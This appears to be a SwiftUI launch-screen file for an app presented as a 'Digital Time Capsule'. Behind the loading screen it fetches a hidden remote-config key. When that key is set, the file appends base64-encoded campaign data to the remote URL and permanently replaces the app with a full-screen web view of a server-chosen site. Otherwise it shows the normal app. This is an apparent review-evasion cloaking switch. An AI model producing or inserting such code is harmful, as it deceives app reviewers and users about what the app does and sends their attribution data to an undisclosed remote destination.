import SwiftUI
import FirebaseRemoteConfig

struct LaunchRootView: View {
    @AppStorage("capEntry") private var point: String = ""
    @AppStorage("capInit") private var first = false
    @AppStorage("capActive") private var visibility = false
    @State private var progress: CGFloat = 0
    @State private var rcv: String? = nil

    var body: some View {
        Group {
            if visibility && !point.isEmpty {
                NovaView(targetUrl: point)
                    .background(Color.black.ignoresSafeArea(.all))
                    .navigationBarHidden(true)
            } else if first {
                RootView()
            } else {
                loadingScreen
            }
        }
        .onAppear {
            withAnimation(.linear(duration: 2.0)) { progress = 1 }
            if !first {
                getData()
            }
        }
    }

    private var loadingScreen: some View {
        ZStack {
            AppTheme.background.ignoresSafeArea()
            VStack(spacing: 36) {
                Image(systemName: "hourglass")
                    .font(.system(size: 64, weight: .bold))
                    .foregroundStyle(
                        LinearGradient(colors: [AppTheme.accent, AppTheme.accentSoft],
                                       startPoint: .topLeading, endPoint: .bottomTrailing)
                    )

                Text("Digital Time Capsule")
                    .font(.system(.title, design: .rounded).weight(.bold))
                    .foregroundStyle(.white)

                LaunchProgressBar(progress: progress)
                    .frame(height: 8)
                    .padding(.horizontal, 48)
            }
            .padding(32)
        }
    }

    private func startLoading() {
        Timer.scheduledTimer(withTimeInterval: 0.1, repeats: true) { timer in
            let appsRetrieved = UserDefaults.standard.bool(forKey: "capReady")
            guard appsRetrieved else { return }

            timer.invalidate()
            DispatchQueue.main.async {
                let campaign = UserDefaults.standard.string(forKey: "capMeta") ?? ""

                if !campaign.isEmpty, let campaignData = campaign.data(using: .utf8) {
                    let base64String = campaignData.base64EncodedString()
                    point = (rcv ?? "") + "?bsc=" + base64String
                } else {
                    point = (rcv ?? "")
                }
                first = true
                visibility = true
            }
        }
    }

    private func getData() {
        let remoteConfig = RemoteConfig.remoteConfig()
        let settings = RemoteConfigSettings()
        settings.minimumFetchInterval = 0
        remoteConfig.configSettings = settings

        remoteConfig.fetchAndActivate { _, error in
            DispatchQueue.main.async {
                if error != nil {
                    first = true
                } else {
                    let fetchedValue = remoteConfig["nova"].stringValue
                    if !fetchedValue.isEmpty {
                        rcv = fetchedValue
                        startLoading()
                    } else {
                        first = true
                        visibility = false
                    }
                }
            }
        }
    }
}

private struct LaunchProgressBar: View {
    var progress: CGFloat

    var body: some View {
        GeometryReader { geo in
            ZStack(alignment: .leading) {
                RoundedRectangle(cornerRadius: 6)
                    .fill(Color.white.opacity(0.12))
                RoundedRectangle(cornerRadius: 6)
                    .fill(AppTheme.accent)
                    .frame(width: geo.size.width * progress)
            }
        }
        .frame(height: 8)
    }
}
